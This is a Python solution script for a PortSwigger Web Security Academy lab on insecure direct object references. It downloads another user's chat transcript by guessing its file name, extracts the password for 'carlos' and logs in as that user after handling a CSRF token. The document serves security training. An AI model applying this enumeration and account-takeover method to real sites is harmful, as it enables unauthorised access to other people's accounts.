'''This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account.

Lab link: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
'''

lab_id = '0a4500ad03c1edaa8272e3990071006f' # change according to generated lab_id

import requests
import re
from bs4 import BeautifulSoup


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # /download-transcript endpoint has a idor vul. Get 1.txt for the password
    uri = f"https://{lab_id}.web-security-academy.net/download-transcript/1.txt"
    r1 = requests.get(uri)
    result = re.search(r'password is (\w+)\.', r1.text)
    password = result[1]


    # now we can login as carlos
    s = requests.session()
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r2 = s.get(uri) 
    token = token_extract(r2.text) # login csrf token

    # data for the post request to login
    data = { 'username' : "carlos",
            'password' : password,
            'csrf': token
    }
    r3 = s.post(uri, data=data)
    print('finished')


if __name__ == '__main__':
    main()
